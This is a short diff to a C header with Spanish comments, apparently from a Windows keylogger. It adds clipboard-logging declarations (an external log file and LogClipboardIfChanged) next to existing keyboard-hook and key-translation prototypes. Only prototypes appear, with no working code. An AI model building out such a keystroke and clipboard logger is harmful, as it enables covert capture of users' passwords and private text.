@@ -31,6 +31,7 @@
 
 #pragma region "Methods"
 
+
 	// llamadas desde el main
 	BOOL IsAdmin(void);
 	BOOL ActivateHook(void);
@@ -38,6 +39,9 @@
 
 	// llamada desde hook.c
 	char*	VirtualKeyToChar(DWORD vkCode, DWORD scanCode, HKL keyboardLayout);
+	// LLamada desde clipboard.c
+	extern FILE* logFile;
+	void LogClipboardIfChanged(void);
 	
 
 #pragma endregion
